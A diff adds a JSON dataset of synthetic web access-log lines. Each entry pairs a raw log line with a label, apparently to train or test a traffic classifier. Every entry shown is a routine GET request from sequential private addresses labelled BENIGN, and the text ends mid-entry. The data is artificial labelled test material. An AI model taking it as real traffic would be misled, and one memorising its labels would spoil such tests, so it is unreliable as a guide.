@@ -1,0 +1,4002 @@
+[
+  {
+    "raw": "192.168.1.10 - - [01/Jun/2026:10:00:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.11 - - [01/Jun/2026:10:00:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.12 - - [01/Jun/2026:10:00:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.13 - - [01/Jun/2026:10:00:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.14 - - [01/Jun/2026:10:00:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.15 - - [01/Jun/2026:10:00:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.16 - - [01/Jun/2026:10:00:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.17 - - [01/Jun/2026:10:00:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.18 - - [01/Jun/2026:10:00:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.19 - - [01/Jun/2026:10:00:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.20 - - [01/Jun/2026:10:00:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.21 - - [01/Jun/2026:10:00:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.22 - - [01/Jun/2026:10:00:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.23 - - [01/Jun/2026:10:00:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.24 - - [01/Jun/2026:10:00:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.25 - - [01/Jun/2026:10:00:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.26 - - [01/Jun/2026:10:00:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.27 - - [01/Jun/2026:10:00:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.28 - - [01/Jun/2026:10:00:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.29 - - [01/Jun/2026:10:00:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.30 - - [01/Jun/2026:10:00:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.31 - - [01/Jun/2026:10:00:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.32 - - [01/Jun/2026:10:00:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.33 - - [01/Jun/2026:10:00:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.34 - - [01/Jun/2026:10:00:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.35 - - [01/Jun/2026:10:00:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.36 - - [01/Jun/2026:10:00:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.37 - - [01/Jun/2026:10:00:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.38 - - [01/Jun/2026:10:00:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.39 - - [01/Jun/2026:10:00:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.40 - - [01/Jun/2026:10:01:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.41 - - [01/Jun/2026:10:01:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.42 - - [01/Jun/2026:10:01:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.43 - - [01/Jun/2026:10:01:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.44 - - [01/Jun/2026:10:01:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.45 - - [01/Jun/2026:10:01:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.46 - - [01/Jun/2026:10:01:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.47 - - [01/Jun/2026:10:01:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.48 - - [01/Jun/2026:10:01:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.49 - - [01/Jun/2026:10:01:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.50 - - [01/Jun/2026:10:01:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.51 - - [01/Jun/2026:10:01:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.52 - - [01/Jun/2026:10:01:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.53 - - [01/Jun/2026:10:01:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.54 - - [01/Jun/2026:10:01:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.55 - - [01/Jun/2026:10:01:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.56 - - [01/Jun/2026:10:01:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.57 - - [01/Jun/2026:10:01:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.58 - - [01/Jun/2026:10:01:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.59 - - [01/Jun/2026:10:01:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.60 - - [01/Jun/2026:10:01:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.61 - - [01/Jun/2026:10:01:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.62 - - [01/Jun/2026:10:01:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.63 - - [01/Jun/2026:10:01:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.64 - - [01/Jun/2026:10:01:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.65 - - [01/Jun/2026:10:01:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.66 - - [01/Jun/2026:10:01:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.67 - - [01/Jun/2026:10:01:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.68 - - [01/Jun/2026:10:01:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.69 - - [01/Jun/2026:10:01:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.70 - - [01/Jun/2026:10:02:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.71 - - [01/Jun/2026:10:02:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.72 - - [01/Jun/2026:10:02:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.73 - - [01/Jun/2026:10:02:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.74 - - [01/Jun/2026:10:02:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.75 - - [01/Jun/2026:10:02:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.76 - - [01/Jun/2026:10:02:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.77 - - [01/Jun/2026:10:02:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.78 - - [01/Jun/2026:10:02:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.79 - - [01/Jun/2026:10:02:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.80 - - [01/Jun/2026:10:02:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.81 - - [01/Jun/2026:10:02:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.82 - - [01/Jun/2026:10:02:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.83 - - [01/Jun/2026:10:02:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.84 - - [01/Jun/2026:10:02:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.85 - - [01/Jun/2026:10:02:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.86 - - [01/Jun/2026:10:02:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.87 - - [01/Jun/2026:10:02:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.88 - - [01/Jun/2026:10:02:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.89 - - [01/Jun/2026:10:02:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.90 - - [01/Jun/2026:10:02:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.91 - - [01/Jun/2026:10:02:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.92 - - [01/Jun/2026:10:02:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.93 - - [01/Jun/2026:10:02:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.94 - - [01/Jun/2026:10:02:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.95 - - [01/Jun/2026:10:02:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.96 - - [01/Jun/2026:10:02:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.97 - - [01/Jun/2026:10:02:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.98 - - [01/Jun/2026:10:02:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.99 - - [01/Jun/2026:10:02:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.100 - - [01/Jun/2026:10:03:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.101 - - [01/Jun/2026:10:03:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.102 - - [01/Jun/2026:10:03:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.103 - - [01/Jun/2026:10:03:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.104 - - [01/Jun/2026:10:03:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.105 - - [01/Jun/2026:10:03:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.106 - - [01/Jun/2026:10:03:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.107 - - [01/Jun/2026:10:03:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.108 - - [01/Jun/2026:10:03:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.109 - - [01/Jun/2026:10:03:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.110 - - [01/Jun/2026:10:03:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.111 - - [01/Jun/2026:10:03:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.112 - - [01/Jun/2026:10:03:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.113 - - [01/Jun/2026:10:03:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.114 - - [01/Jun/2026:10:03:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.115 - - [01/Jun/2026:10:03:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.116 - - [01/Jun/2026:10:03:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.117 - - [01/Jun/2026:10:03:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.118 - - [01/Jun/2026:10:03:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.119 - - [01/Jun/2026:10:03:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.120 - - [01/Jun/2026:10:03:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.121 - - [01/Jun/2026:10:03:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.122 - - [01/Jun/2026:10:03:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.123 - - [01/Jun/2026:10:03:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.124 - - [01/Jun/2026:10:03:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.125 - - [01/Jun/2026:10:03:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.126 - - [01/Jun/2026:10:03:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.127 - - [01/Jun/2026:10:03:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.128 - - [01/Jun/2026:10:03:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.129 - - [01/Jun/2026:10:03:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.130 - - [01/Jun/2026:10:04:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.131 - - [01/Jun/2026:10:04:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.132 - - [01/Jun/2026:10:04:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.133 - - [01/Jun/2026:10:04:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
